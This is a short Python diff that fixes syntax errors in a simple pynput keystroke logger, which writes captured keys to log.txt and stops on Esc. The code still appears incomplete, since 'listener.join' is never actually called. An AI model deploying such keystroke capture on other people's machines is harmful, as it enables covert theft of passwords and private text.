@@ -19,12 +19,12 @@ def on_press(key):
 def ecrire_fichier(keys):
 	with open("log.txt","w+") as fichier:
 		for key in keys:
-			fichier.write(str(key)
+			fichier.write(str(key))
 
 def on_release(key):	
 	if key == Key.esc:
 		return False
 
 
-whith Listener(on_press=on_press,on_release=on_release) as listener: 
+with Listener(on_press=on_press,on_release=on_release) as listener: 
 	listener.join
